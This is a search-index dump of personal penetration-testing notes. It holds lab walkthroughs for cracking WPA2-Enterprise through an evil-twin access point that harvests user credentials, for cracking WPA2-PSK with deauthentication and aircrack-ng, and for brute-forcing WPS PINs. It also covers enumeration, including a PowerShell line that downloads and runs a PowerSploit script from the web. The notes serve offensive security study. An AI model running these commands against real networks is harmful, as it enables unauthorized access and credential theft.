Handshake","text":"<pre><code># View Current WiFi Driver\nsudo airmon-ng\n# Create Monitor Interface\nsudo airmon-ng start &lt;interface&gt;\n</code></pre> <p>With the monitor interface configured, next I began sniffing the network to find what networks are available.</p> <p><pre><code># See available networks/channels/security\nsudo airodump-ng &lt;mon_interface&gt;\n</code></pre> (In this case, my monitor interface is wlan0mon)</p> <p></p> <p>This revealed the SSID of the WPA2-MGT network, that it's on channel 11, and that the MAC address is \"02:13:37:BE:EF:03\".</p> <p>With this knowledge, I restarted my \"airodump\" listener, refining it to focus specifically on the target network.</p> <p><pre><code># Capture wireless traffic to a file\nsudo airodump-ng --bssid \"02:13:37:BE:EF:03\" -c 11 --write \"&lt;network_ssid&gt;\" wlan0mon\n</code></pre> (By specifying '--write', all traffic will be dumped into a file we can reference later.)</p> <p>In a separate terminal, I validated that the network was vulnerable to injection prior to performing a de-authentication attack.</p> <pre><code># Perform an injection test\nsudo aireplay-ng -9 -a \"02:13:37:BE:EF:03\" wlan0mon\n\n# Perform a de-authentication attack\nsudo aireplay-ng --deauth 100 -a \"02:13:37:BE:EF:03\" wlan0mon\n</code></pre> <p></p> <p></p> <p>After performing the de-authentication attack, I was able to capture a WPA handshake.</p> <p></p> <p>After capturing the WPA handshake, I closed my \"airodump\" listener and disabled my monitor interface.</p> <pre><code># Remove monitor interface\nsudo airmon-ng stop wlan0mon\n</code></pre> <p></p> <p>Unlike a standard WPA2-PSK network, we can't just crack the passphrase for authentication. We need to have end users mistakenly authenticate to us via an Evil Twin, so that their credentials can be cracked and used for authentication.</p>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WPA2-EAP%20Networks%20%28Enterprise%29/#extracting-certificates-from-the-capture","title":"Extracting Certificates from the Capture","text":"<p>Next, I opened the packet capture that was created by my original \"airodump\" capture with Wireshark to grab the certificates.</p> <pre><code>wireshark ./&lt;network_ssid&gt;-01.cap\n</code></pre> <p>In Wireshark, I filtered on \"tls.handshake.certificate\" to pull up the frames containing certificates.</p> <p></p> <p>Once I filtered the packets, I was able to pull the certificates.</p> <pre><code>--&gt; Extensible Authentication Protocol\n    --&gt; Transport Layer Security\n        --&gt; TLSv1.2 Record Layer: Handshake Protocol: Certificate\n            --&gt; Handshake Protocol: Certificate\n                --&gt; Certificates\n</code></pre> <p></p> <p>Within the Certificates pane, there were two certificates -- a server certificate and a Certificate Authority certificate.  I made sure to export both of them for later.</p> <pre><code>Right Click Certificate --&gt; Export Packet Bytes\n</code></pre> <p></p> <p>I exported the certificate packet bytes to:</p> <ul> <li>\"<code>&lt;network_ssid&gt;Certificate1.der</code>\"</li> <li>\"<code>&lt;network_ssid&gt;Certificate2.der</code>\"</li> </ul> <p>Once the certificates were exported, I was able to read them with \"openssl\" and validate the export was successful.</p> <pre><code>openssl x509 -inform der -in &lt;network_ssid&gt;Certificate1.der -text\nopenssl x509 -infrom der -in &lt;network_ssid&gt;Certificate2.der -text\n</code></pre> <p> (We see above that this is a server certificate)</p> <p> (Whereas this looks like a certificate authority certificate)</p>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WPA2-EAP%20Networks%20%28Enterprise%29/#configuring-an-evil-twin-ap","title":"Configuring an Evil Twin AP","text":"<p>Next, I took the details within those certificates and copied them into the settings of a local RADIUS server (freeRADIUS) in order to configure an Evil Twin AP.  These files were created in the \"/etc/freeradius/3.0/certs\" directory and the values were as follows:</p> <ul> <li> <p>Server Certificate: <code>server.cnf</code> </p> </li> <li> <p>CA Certificate: <code>ca.cnf</code> </p> </li> </ul> <p>Next, I rebuilt the certificates -- but first I had to delete the current Diffie-Hellman (DH) parameters to avoid potential errors down the line.</p> <p></p> <p>Now that the new certificates have been generated, I created a custom \"hostapd-mana.conf\" configuration file to utilize these certificates, allow clients to authenticate to my AP, and output authentication credentials to a \"/tmp/hostapd.creds\" file.</p> <ul> <li> <p>Configuration File: <code>/etc/hostapd-mana/hostapd-mana.conf</code> <pre><code># SSID of the AP\nssid=&lt;ssid&gt;\n\n# Network interface to use and driver type\ninterface=wlan0\ndriver=nl80211\n\n# Channel and mode\nchannel=&lt;channel&gt;\nhw_mode=g\n\n# Setting up hostapd as an EAP server\nieee8021x=1\neap_server=1\n\n# Key workaround for Win XP\neapol_key_index_workaround=0\n\neap_user_file=/etc/hostapd-mana/mana.eap_user\n\n# Certificate paths created earlier\nca_cert=/etc/freeradius/3.0/certs/ca.pem\nserver_cert=/etc/freeradius/3.0/certs/server.pem\nprivate_key=/etc/freeradius/3.0/certs/server.key\n\n# The password is actually 'whatever'\nprivate_key_passwd=whatever\ndh_file=/etc/freeradius/3.0/certs/dh\n\n# Open authentication\nauth_algs=1\nwpa=3\nwpa_key_mgmt=WPA-EAP\nwpa_pairwise=CCMP TKIP\n\n# Enable Mana WPE\nmana_wpe=1\nmana_credout=/tmp/hostapd.creds\nmana_eapsuccess=1\nmana_eaptls=1\n</code></pre></p> </li> <li> <p>Example: </p> </li> </ul> <p>Lastly, I created an \"/etc/hostapd-mana/mana.eap_user\" file to increase the likelihood of targets being able to connect to my fake AP.</p> <ul> <li> <p>Configuration File: <code>/etc/hostapd-mana/mana.eap_user</code> <pre><code>*     PEAP,TTLS,TLS,FAST\n\"t\"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    \"pass\"   [2]\n</code></pre></p> </li> <li> <p>This format of the\u00a0\"hostapd.eap_user\"\u00a0file is as follows.</p> <ul> <li>The first column indicates a specific user by username or, in the event of wildcard character (*), any user. It can contain a domain name as well.</li> <li>The second column contains the protocols allowed for the specific users and authentication phase.</li> <li>The third one is optional and is used for the password when a specific user is mentioned.</li> <li>The fourth one (indicated with \"[2]\"), indicates that the settings on this line are for phase 2 authentication.</li> </ul> </li> <li> <p>Example: </p> </li> </ul>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WPA2-EAP%20Networks%20%28Enterprise%29/#capturing-authenticated-user-credentials","title":"Capturing Authenticated User Credentials","text":"<p>Once everything was configured, I started my Evil Twin AP for users to authenticate to.</p> <p></p> <p>Users began authenticating with my Evil Twin, and not only did I capture their hash, but also the domain name for the network.  This will be utilized for authentication later.</p> <p></p> <p>When users authenticate to the AP, their credentials are stored in \"/tmp/hostapd.creds\".  Looking into the file, it contains multiple different hashes so that you can crack it with your preferred hash cracking tool (asleap, johntheripper, hashcat, etc.).  Once these credentials are cracked, I would then be able to authenticate into the network as the cracked user.</p> <p></p> <p>Using the \"asleap\" syntax provided and feeding it \"rockyou.txt\" for a dictionary attack, I managed to crack the password for user \"iris\".</p> <p></p> <pre><code># Credentials\nUsername: Castle\\iris\nPassword: patricia\n</code></pre>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WPA2-PSK%20Networks%20%28Personal%29/","title":"Cracking WPA2 PSK Networks (Personal)","text":"<p>Info</p> <p>This was performed on a controlled network, meaning everything performed was both legal and ethical.</p> <p>This walkthrough does not contain in-depth explanations of every tool used.  For references to the tools used, see my Wireless Cheatsheet.</p>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WPA2-PSK%20Networks%20%28Personal%29/#overview","title":"Overview","text":"<p>WPA2-PSK (also known as WPA2-Personal) is one of the most commonly used types Wi-Fi network authentication -- most common in home or public settings.</p> <p>The PSK stands for \"Pre-Shared Key\", meaning authentication is handled via a single pre-shared passphrase, aka a static password.  All devices and users connecting to the network must know and use this passphrase.</p> <p>This means for authentication, a bad actor must capture the handshake between an end-user and the network, then crack that handshake to acquire the network's password.</p>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WPA2-PSK%20Networks%20%28Personal%29/#capturing-the-wpa-handshake","title":"Capturing the WPA Handshake","text":"<pre><code># View Current WiFi Driver\nsudo airmon-ng\n# Create Monitor Interface\nsudo airmon-ng start &lt;interface&gt;\n</code></pre> <p>With the monitor interface configured, next I began sniffing the network to find what networks are available.</p> <p><pre><code># See available networks/channels/security\nsudo airodump-ng &lt;mon_interface&gt;\n</code></pre> (In this case, my monitor interface is wlan0mon)</p> <p></p> <p>This revealed the SSID of the WPA2-PSK network, that it's on channel 4, and that the MAC address is \"02:13:37:BE:EF:03\".</p> <p>With this knowledge, I restarted my \"airodump\" listener, refining it to focus specifically on the target network.</p> <pre><code>sudo airodump-ng --bssid \"02:13:37:BE:EF:03\" -c 4 --write \"&lt;network_ssid&gt;\" wlan0mon\n</code></pre> <p>In a separate terminal, I validated that the network was vulnerable to a deauth attack before performing the actual attack.</p> <pre><code># Perform an injection test\nsudo aireplay-ng -9 -a \"02:13:37:BE:EF:03\" wlan0mon\n\n# Perform a de-authentication attack\nsudo aireplay-ng --deauth 100 -a \"02:13:37:BE:EF:03\" wlan0mon\n</code></pre> <p></p> <p></p> <p>After performing the de-authentication attack, I was able to capture a WPA handshake.</p> <p></p> <p>After capturing the WPA handshake, I closed my \"airodump\" listener and disabled my monitor interface.</p> <p></p>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WPA2-PSK%20Networks%20%28Personal%29/#cracking-the-passphrase","title":"Cracking the Passphrase","text":"<p>With the WPA handshake captured, I was able to crack the passphrase by using \"aircrack-ng\" -- feeding the \"airodump\" capture as the target and \"rockyou.txt\" to it as the wordlist.</p> <pre><code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz\nsudo aircrack-ng -w /usr/share/wordlists/rockyou.txt ./&lt;network_ssid&gt;-01.cap\n</code></pre> <p></p> <pre><code>Passphrase: 1q2w3e4r\n</code></pre>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WPS%20Networks/","title":"Cracking WPS Networks","text":"<p>Info</p> <p>This was performed on a controlled network, meaning everything performed was both legal and ethical.</p> <p>This walkthrough does not contain in-depth explanations of every tool used.  For references to the tools used, see my Wireless Cheatsheet.</p>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WPS%20Networks/#overview","title":"Overview","text":"<p>WPS (Wi-Fi Protected Setup) is a network setup feature that provides simplified methods for connecting devices to a Wi-Fi network. It doesn't replace or dictate the choice of the underlying security protocol (e.g., WPA2-PSK, WEP, etc.). Instead, it offers a convenient way to establish a connection with either WPA2-PSK or WEP as the security protocol.</p> <p>The predominant methods of WPS connections are: - Push Button Configuration (e.g., pressing on a physical button on the Wi-Fi router) - PIN Entry (generally an 8-digit numerical PIN)</p> <p>This means for authentication, a bad actor needs to find a network that supports WPS (below version 2.0, which introduced bruteforce protections) and crack the PIN.</p>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WPS%20Networks/#cracking-the-wps-pin","title":"Cracking the WPS PIN","text":"<p>(Example using tools such as \"wash\", \"reaver\", and \"airgeddon\")</p> <pre><code># View Current WiFi Driver\nsudo airmon-ng\n# Create Monitor Interface\nsudo airmon-ng start wlan0\n\n### or ###\n\n# Add a separate monitor mode interface based on an existing interface\nsudo iw dev &lt;interface&gt; interface add &lt;monitor_name&gt; type monitor\n# Bring new interface up\nsudo ip link set &lt;monitor_name&gt; up\n</code></pre> <p>Once we have our monitor interface setup, we can use it to scan for broadcasting SSID's that support WPS.</p> <pre><code>sudo wash -i wlan0mon\n</code></pre> <p>Example output: (WPS 2.0 introduced bruteforce protections, meaning we want to find a broadcast with WPS 1.0 that is NOT locked. Meaning we're looking for:  \"Lck : no\")</p> <p>Once we find a vulnerable target, we can then attempt to exploit them using a tool called \"reaver\".  <pre><code>sudo reaver -b &lt;bssid&gt; -c &lt;channel&gt; -i wlan0mon -v\n</code></pre></p> <p>This brute force is very time consuming, and take upwards of 6 hours.  The potential work around is using the <code>-K</code> parameter which will utilize <code>PixieWPS</code></p> <pre><code>sudo reaver -b &lt;bssid&gt; -c &lt;channel&gt; -i wlan0mon -v -K\n</code></pre> <p>Example Output: </p> <p>If that still failed, we can use check to see if the device uses an empty pin using the <code>-p</code> parameter.</p> <p>To check for known PINs, we can use the \"airgeddon\" project. <pre><code>sudo apt install airgeddon\nsource /usr/share/airgeddon/known_pins.db\necho ${PINDB[\"&lt;first_half_of_bssid\"]}\n</code></pre></p> <p>If there the above code returns any  values, we can try the returned PINs manually with reaver.</p>"},{"location":"Red%20Cell/03.%20Enumeration/","title":"Enumeration","text":"<ul> <li>Enumeration is the process of gathering information about a target, such as network services, user accounts, or system configurations, to identify potential vulnerabilities for exploitation.</li> </ul>"},{"location":"Red%20Cell/03.%20Enumeration/#table-of-contents","title":"Table of Contents","text":"<ul> <li>adPEAS</li> <li>Enumeration Checklist</li> <li>Java RMI</li> <li>Network Enumeration</li> <li>SMTP</li> <li>Web Fuzzing</li> <li>Windows Service Enumeration</li> <li>WordPress</li> </ul>"},{"location":"Red%20Cell/03.%20Enumeration/Enumeration%20Checklist/","title":"Enumeration Checklist","text":""},{"location":"Red%20Cell/03.%20Enumeration/Enumeration%20Checklist/#pre-exploitation","title":"Pre-Exploitation","text":"<ul> <li> <p> Port Scanning</p> <ul> <li>Do I need to adjust my scan to avoid detection?</li> <li>Will the host block ICMP? Do I need to use <code>-Pn</code>? <pre><code># Scan ALL Ports, OS Detection, and Run All \"*vuln*\" Scripts\nrustscan -a &lt;ip_addr&gt; -- -O --script vuln\n\n# Nmap Eqiuvalent\nsudo nmap &lt;ip_addr&gt; -p- -O --script vuln \n</code></pre></li> </ul> </li> <li> <p> Web Technology Enumeration</p> <ul> <li>Is the server running any web services?</li> <li>What language is the site using? <code>.php</code>? <code>.aspx</code>? <pre><code># Wappalyzer Plugin Output\n</code></pre> </li> </ul> </li> <li> <p> Web Fuzzing</p> <ul> <li>Do I need to adjust my fuzz to account for the site language?</li> <li>Are there any hidden subdomains? <pre><code># Directory Fuzzing\nsudo ffuf -u http(s)://&lt;ip_addr&gt;:&lt;port&gt;/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n\n# Subdomain Fuzzing\nsudo ffuf -u \"http://&lt;domain&gt;:&lt;port&gt;\" -H \"Host: FUZZ.&lt;domain&gt;\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 302\n</code></pre></li> </ul> </li> <li> <p> Enum4Linux:</p> <ul> <li>Is port 445 open? <pre><code># Windows/Samba Enumeration\nsudo enum4linux -v &lt;ip_addr&gt;\n</code></pre></li> </ul> </li> <li> <p> SMB</p> <ul> <li>Is port 445 open?</li> <li>Can I authenticate with null credentials? <pre><code># Attempt Null Cred SMB Authentication\nsmbmap -H &lt;ip_addr&gt; -u \" \"\n</code></pre></li> </ul> </li> <li> <p> FTP</p> <ul> <li>Is port 21 open?</li> <li>Is anonymous logon authorized? <pre><code># Attempt anonymous FTP login (anonymous:anonymous)\nftp &lt;ip_addr&gt;\n&gt; Username: anonymous\n&gt; Password: anonymous\n</code></pre></li> </ul> </li> </ul> <p>Notes: 1. Operating System: 2. Domain: 3. Known Service(s) / Version(s):  4. Potential Vulnerabilities / CVE's: </p> <p>Search Github for Potential CVE PoC's: <pre><code>https://github.com/search?q=&lt;cve&gt;\n</code></pre></p>"},{"location":"Red%20Cell/03.%20Enumeration/Enumeration%20Checklist/#post-exploitation","title":"Post Exploitation","text":"<ul> <li> What are my privileges?</li> <li> What services are running?</li> <li> What current network connections are there?</li> <li> What files can I execute?</li> <li> Are there any files or variables containing credentials?</li> </ul>"},{"location":"Red%20Cell/03.%20Enumeration/Java%20RMI/","title":"Java RMI","text":""},{"location":"Red%20Cell/03.%20Enumeration/Java%20RMI/#overview","title":"Overview","text":"<p>Java Remote Method Invocation (Java RMI) enables the programmer to create distributed Java technology-based to Java technology-based applications, in which the methods of remote Java objects can be invoked from other Java virtual machines, possibly on different hosts.</p> <p>Realistically, this technology is a huge can of worms that I don't know much about.  However, that's where Remote Method Guesser comes into play:</p> <p>Info</p> <p>remote-method-guesser\u00a0(rmg) is a\u00a0Java RMI\u00a0vulnerability scanner and can be used to identify and verify common security vulnerabilities on\u00a0Java RMI\u00a0endpoints.</p>"},{"location":"Red%20Cell/03.%20Enumeration/Java%20RMI/#remote-method-guesser-rmg-installation","title":"Remote-Method-Guesser (RMG) Installation","text":"<p>RMG was originally built off of Java 8 (which is a surprising hassle to install on modern Kali Linux), and subsequently does not work with modern versions of Java.</p> <p>RMG v4.3.1: - To install, we need to download an archived OpenJDK 8 binary to specify when running <code>rmg.jar</code>. </p> <pre><code># Download RMG &amp; Java 8 (modern Java doesn't work with RMG)\nwget https://github.com/qtc-de/remote-method-guesser/releases/download/v4.3.1/rmg-4.3.1-jar-with-dependencies.jar\nwget https://builds.openlogic.com/downloadJDK/openlogic-openjdk-jre/8u352-b08/openlogic-openjdk-jre-8u352-b08-linux-x64.tar.gz\n\n# Extract &amp; Rename\ntar -xzvf openlogic-openjdk-jre-8u352-b08-linux-x64.tar.gz\nrm -f openlogic-openjdk-jre-8u352-b08-linux-x64.tar.gz\nmv openlogic-openjdk-jre-8u352-b08-linux-x64 openjdk-jre-8\nmv rmg-4.3.1-jar-with-dependencies.jar rmg.jar\n</code></pre> <p>Info</p> <pre><code>Supposedly as of RMG v4.4.0, it is now compatible with Java16+.  I have not validated this, but it's noteworthy.\n</code></pre>"},{"location":"Red%20Cell/03.%20Enumeration/Java%20RMI/#general-usage","title":"General Usage:","text":"<p>Below is very high level usage syntax (specifically for the v4.3.1 installed above). - For more verbose and granular usage, reference the project's GitHub page.</p> <pre><code># v4.3.1: Scan and Enumerate targets using the OpenJDK 8 binary\n./openjdk-jre-8/bin/java -jar rmg.jar scan &lt;target&gt;\n./openjdk-jre-8/bin/java -jar rmg.jar enum &lt;target&gt; &lt;port&gt;\n</code></pre> <p></p>"},{"location":"Red%20Cell/03.%20Enumeration/Network%20Enumeration/","title":"Network Enumeration","text":"<p>There are multiple ways to enumerate the network, but here are a couple different methods that don't require any tunneling or port forwarding.</p>"},{"location":"Red%20Cell/03.%20Enumeration/Network%20Enumeration/#powershell","title":"Powershell","text":"<pre><code># See other computers that have touched the current one in some way\nnet view\n\n# View networking information (including if the box is dual NIC'd)\nipconfig /all\n\n# /24 Ping Sweep\n$TargetNetwork = \"&lt;first.three.octets&gt;\"\n1..255 | % {echo \"$TargetNetwork.$_\"; ping -n 1 -w 100 \"$TargetNetwork.$_\" | Select-String ttl}\n\n# /24 NSLOOKUP Scan\n$TargetNetwork = \"&lt;first.three.octets&gt;\"\n1..255 | % {echo \"IP: $TargetNetwork.$_\"; nslookup \"$TargetNetwork.$_\" | Select-String Name &gt;&gt; 192-168-1-0.txt}\n\n# 1024 Port Scan (Very Slow)\n$TargetIP = \"&lt;ip_address&gt;\"\n1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect($TargetIP,$_)) \"Port $_ is open!\"} 2&gt;$null\n\n# Load \"Invoke-PortScan.ps1\" into session.  \n# - Already on Kali, or can be downloaded from: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1\n# - Requires AMSI bypass or disabled AV\niex ([System.Net.WebClient]::new().DownloadString('&lt;script_url&gt;'))\nInvoke-Portscan -Hosts 192.168.1.1/24 -TopPorts 25\n</code></pre>"},{"location":"Red%20Cell/03.%20Enumeration/Network%20Enumeration/#nmap","title":"Nmap","text":"<ul> <li>TCP Scan ALL ports, get OS info, and do a vulnerability scan (loud) <pre><code>sudo nmap &lt;ip_addr&gt;&lt;/CIDR&gt; -p- -A --script vuln\n</code></pre></li> </ul> <p>If above returns nothing, attempt a UDP scan.  Either add <code>-Pn</code> or <code>-sU</code> for a UDP scan.</p> <ul> <li> <p>UDP Scan <pre><code>nmap -sU &lt;ip_addr&gt;&lt;/CIDR&gt;\n</code></pre></p> </li> <li> <p>If SMTP (port 25) is open, we attempt to enumerate mail users. <pre><code>nmap --script smtp-enum-users.nse &lt;ip_addr&gt;\n</code></pre></p> </li> </ul>"},{"location":"Red%20Cell/03.%20Enumeration/Network%20Enumeration/#rustscan","title":"Rustscan","text":"<p><code>rustscan</code> is effectively a wrapper for <code>nmap</code> written in rust -- by default it rapidly scans ALL ports then feeds the up ports to <code>nmap</code> for a more granular enumeration.</p>"},{"location":"Red%20Cell/03.%20Enumeration/Network%20Enumeration/#installation","title":"Installation","text":"<pre><code># Install Rust and Cargo\ncurl https://sh.rustup.rs -sSf | sh\nrustup\n# Install Rustscan\ncargo install rustscan\n</code></pre>"},{"location":"Red%20Cell/03.%20Enumeration/Network%20Enumeration/#usage","title":"Usage","text":"<p><pre><code>rustscan -a &lt;hostname or IP/CIDR&gt; --ulimit 500 -- &lt;nmap_args&gt;\n# -a = target address(s) / network\n# -u = adjusts the amount of open sockets at a given time\n# -- = pass nmap arguments to rustscan\n</code></pre> - Note: <code>ulimit</code> of 500 slows the scan down, but prevents (rare) false positives</p> <p><pre><code># Example:\nrustscan -a 192.168.108.124 -u 500 -- -A --script vuln\n</code></pre> </p>"},{"location":"Red%20Cell/03.%20Enumeration/SMTP/","title":"SMTP","text":"<p>(Thank you @numonce)</p>"},{"location":"Red%20Cell/03.%20Enumeration/SMTP/#overview","title":"Overview","text":"<ul> <li>SMTP is a service that can be found in most infrastructure penetration tests. This service can help the penetration tester to perform username enumeration via the EXPN and VRFY commands if these commands have not been disabled by the system administrator.</li> </ul>"},{"location":"Red%20Cell/03.%20Enumeration/SMTP/#smtp-user-enum","title":"smtp-user-enum","text":"<ul> <li>A tool that can be used is <code>smtp-user-enum</code> which provides 3 methods of user enumeration.<ul> <li>The commands that this tool is using in order to verify usernames are the EXPN,VRFY and RCPT. It can also support single username enumeration and multiple by checking through a .txt list. So in order to use this tool effectively you will need to have a good list of usernames. </li> </ul> </li> </ul> <pre><code># Check if SMTP users in users.txt exist\nsmtp-user-enum -M VRFY -U users.txt -t &lt;ip_addr&gt;\n\n# Check if SMTP users in users.txt exist w/ a valid email addresses\nsmtp-user-enum -M VRFY -D &lt;target_domain&gt; -U users.txt -t &lt;ip_addr&gt;\n</code></pre>"},{"location":"Red%20Cell/03.%20Enumeration/Web%20Fuzzing/","title":"Web Fuzzing","text":""},{"location":"Red%20Cell/03.%20Enumeration/Web%20Fuzzing/#ffuf","title":"ffuf","text":"<p><code>Ffuf</code> is a project heavily inspired by wfuzz written in Go. Works basically the same, in that you just replace the word you want to fuzz with FUZZ. </p> <p>Installation: <pre><code>sudo apt install ffuf\n</code></pre></p> <p>General Usage: <pre><code>ffuf -u \"http(s)://&lt;ip_addr&gt;/FUZZ\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n</code></pre></p>"},{"location":"Red%20Cell/03.%20Enumeration/Web%20Fuzzing/#wfuzz","title":"wfuzz","text":"<p><code>Wfuzz</code> has been created to facilitate the task in web applications assessments and it is based on a simple concept: it replaces any reference to the FUZZ keyword by the value of a given payload.</p> <p>Filtering Options: <pre><code>--hs/ss \"regex\" #Hide/Show\n#Simple example, match a string: \"Invalid username\"\n#Regex example: \"Invalid *\"\n\n--hc/sc CODE #Hide/Show by code in response\n--hl/sl NUM #Hide/Show by number of lines in response\n--hw/sw NUM #Hide/Show by number of words in response\n--hh/sh NUM #Hide/Show by number of chars in response\n--hc/sc NUM #Hide/Show by response code\n</code></pre></p> <p>Output Options: <pre><code>wfuzz -e printers #Prints the available output formats\n-f /tmp/output,csv #Saves the output in that location in csv format\n</code></pre></p> <p>Encoders Options: <pre><code>wfuzz -e encoders #Prints the available encoders\n#Examples: urlencode, md5, base64, hexlify, uri_hex, doble urlencode\n</code></pre></p> <p>Directory Busting: <pre><code>#Filter by whitelisting codes\nwfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200,202,204,301,302,307,403 http://example.com/uploads/FUZZ\n</code></pre></p> <p>Subdomain Bruteforcing: <pre><code>wfuzz -w -H \"Host: FUZZ.target-domain-name.com\" /usr/share/wordlists/dirb/big.txt 127.0.0.1\n</code></pre></p>"},{"location":"Red%20Cell/03.%20Enumeration/Web%20Fuzzing/#seclists","title":"SecLists","text":"<p><code>SecLists</code> is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.</p> <p>Installation: <pre><code># In the Kali apt repos\nsudo apt install seclists # Will then be found in /usr/share/seclists\n\n# Or use the Github Repo\ngit clone https://github.com/danielmiessler/SecLists.git\n</code></pre></p>"},{"location":"Red%20Cell/03.%20Enumeration/Windows%20Service%20Enumeration/","title":"Windows Service Enumeration","text":"<p>Info</p> <p>This note is still in development.</p> <p>See my PoorMansArmory project.</p> <pre><code>function Enum-Services {\n#.SYNOPSIS\n# Enumerate, Audit, and Parse Windows Services\n# ARBITRARY VERSION NUMBER:  1.0.0\n# AUTHOR:  Tyler McCann (@tylerdotrar)\n#\n#.DESCRIPTION\n# Enumeration script developed to easily parse the Access Control Lists (ACLs) and other parameters\n# of Windows Services, such as the service owner, start mode, and whether the service path is vulnerable\n# to an unquoted service path attack.  Unquoted service paths are able to be audited for writeability\n# via the '-Audit' parameter.\n#\n# By default the script will return an object containing sorted service binary ACLs.\n# \n# Parameters:\n#   -StartMode      --&gt;  Services with specified start modes (e.g., 'Auto','Disabled','Manual')\n#   -UnquotedPaths  --&gt;  Services containing spaces in their paths but not wrapped in quotations\n#   -Audit          --&gt;  Test if vulnerable portions of the unquoted path are writeable for the current user\n#   -Owner          --&gt;  Services belonging to specified Owner (e.g., 'SYSTEM')\n#   -FullControl    --&gt;  Services with FullControl access rights for specified group (e.g., 'Administrators')\n#   -OnlyPath       --&gt;  Return full service paths instead of ACL's\n#   -Help           --&gt;  Return Get-Help information\n#\n#.LINK\n# https://github.com/tylerdotrar/PoorMansArmory\n\n\n    Param(\n        [string]$StartMode,\n        [switch]$UnquotedPaths,\n        [switch]$Audit,\n        [string]$Owner,\n        [string]$FullControl, # Partially broken; needs refined logic.\n        [switch]$OnlyPath,\n        [switch]$Help\n    )\n\n\n    # Return Get-Help Information\n    if ($Help) { return (Get-Help Enum-Services) }\n\n\n    # Error Correction\n    if ($StartMode) {\n        $StartOptions = @('Auto','Manual','Disabled')\n        if ($StartOptions -notcontains $StartMode) { return (Write-Host '[-] Invalid start mode.' -ForegroundColor Red) }\n    }\n    if ($Audit -and !$UnquotedPaths) { return (Write-Host '[-] Auditing only supports unquoted service paths.' -ForegroundColor Red) }\n\n\n    # Internal Function(s)\n    function Perform-PathAudit ($ServicePaths) {\n\n        # Audit unquoted service paths for writeability\n        foreach ($UnquotedPath in $ServicePaths) {\n            Write-Output \"[+] Auditing unquoted service path writeability...\"\n            Write-Host \" o  Target Service : '$UnquotedPath'\"\n\n\n            # Remove all path data after the last space\n            $LastSegment = ($UnquotedPath).Split(' ')[-1]\n            $PreSpace    = ($UnquotedPath).Replace($LastSegment,'')\n\n\n            # Check every preceding directory for spaces, ignoring the drive letter\n            $VulnerablePaths = @()\n            $PathSegments = ($PreSpace.Split('\\')).Split('/')\n\n\n            # If directory segment contains a space, service path is vulnerable here.\n            for ($i=1; $i -lt $PathSegments.Length;$i++) {\n\n                $Reconstructed = $PathSegments[0..$i] -join '\\'\n                if ($PathSegments[$i] -like \"* *\") { $VulnerablePaths += $Reconstructed }\n            }\n\n\n            # Audit each vulnerable portion of the path\n            foreach ($VulnerablePath in $VulnerablePaths) {\n\n                # Remove all path data after the last '\\'\n                $LastVSegment = $VulnerablePath.Split('\\')[-1]\n                $RootVPath    = $VulnerablePath.Replace($LastVSegment,'')\n\n                Write-Host \" o  Auditing Path  : '$RootVPath'\"\n\n\n                # Randomly generate a filename to avoid conflictions\n                $AuditFile = $NULL\n                for ($i=0; $i -lt 6; $i++) {\n                    $AuditFile += Get-Random -InputObject ([char[]](([char]'a')..([char]'z')))\n                    $AuditFile += Get-Random -InputObject ([char[]](([char]'A')..([char]'Z')))\n                }\n                $AuditFile += '.exe'\n\n\n                # Full audit file path\n                $AuditFilePath = Join-Path -Path $RootVPath -ChildPath $AuditFile\n                #Write-Host \" o  Audit File     : '$AuditFilePath'\"\n\n\n                # Begin Audit\n                Try {\n                    New-Item -Path $AuditFilePath -ErrorAction Stop -Force | Out-Null\n                    Remove-Item -Path $AuditFilePath -ErrorAction SilentlyContinue -Force | Out-Null\n                    $isWriteable = $TRUE\n                }\n                Catch { $isWriteable = $FALSE}\n\n\n                # Return Results\n                Write-Host \" o  Path Writeable : \" -NoNewline\n                if ($isWriteable) { Write-Host \"$isWriteable\" -ForegroundColor Green }\n                else              { Write-Host \"$isWriteable\" -ForegroundColor Red  }\n            }\n            Write-Host ''\n        }\n    }\n\n\n    # Cleanup pathnames\n    $CleanServices = @()\n    foreach ($Service in (Get-CimInstance -ClassName win32_service)) {\n\n        # Only Collect Services with Specified Start Modes\n        if ($StartMode) { $Service = $Service | ? { $_.StartMode -eq \"$StartMode\" } }\n\n        $Service = $Service.Pathname\n\n        # Remove options after the executable\n        $Service = ($Service -split ' -')[0]\n        $Service = ($Service -split ' /')[0]\n        $Service = ($Service -split ' \\\\')[0]\n\n\n        # Contains a Space but not Quotation Marks\n        if ($UnquotedPaths) { $Service = ($Service | ? { ($_ -like '* *') -and ($_ -notlike '*\"*') }) }\n\n\n        # Remove quotations from path (should be implied when passed to Get-Acl)\n        else {\n            $Service = $Service.Replace('\"','')\n            $Service = $Service.Replace(\"'\",'')\n        }\n\n\n        # If path is not empty, add to 